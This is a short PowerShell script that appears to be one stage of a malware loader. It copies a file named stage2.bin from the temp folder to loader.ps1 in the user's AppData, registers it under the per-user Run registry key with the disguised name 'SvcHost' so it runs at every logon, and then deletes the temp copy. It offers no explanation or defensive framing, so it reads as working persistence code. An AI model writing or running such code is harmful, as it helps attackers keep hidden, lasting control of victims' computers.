$RunKeyPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
$RegistryValue = 'SvcHost'
$PersistencePath = "$env:APPDATA\loader.ps1"
$ErrorActionPreference = "Stop"

try {
    Write-Verbose "Installing per-user persistence"
    if (-not (Test-Path -Path $PersistencePath)) {
        Copy-Item -Path "$env:TEMP\stage2.bin" -Destination $PersistencePath -Force
    }
    New-ItemProperty -Path $RunKeyPath -Name $RegistryValue -Value ('powershell.exe -NoP -File "' + $PersistencePath + '"') -PropertyType String -Force
    $StageResult = Get-ItemProperty -Path $RunKeyPath -Name $RegistryValue
    Write-Verbose ("Registered value: " + $StageResult.$RegistryValue)
}
catch {
    Write-Warning "Run-key installation failed: $($_.Exception.Message)"
}

Write-Verbose "stage marker 16 reached"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
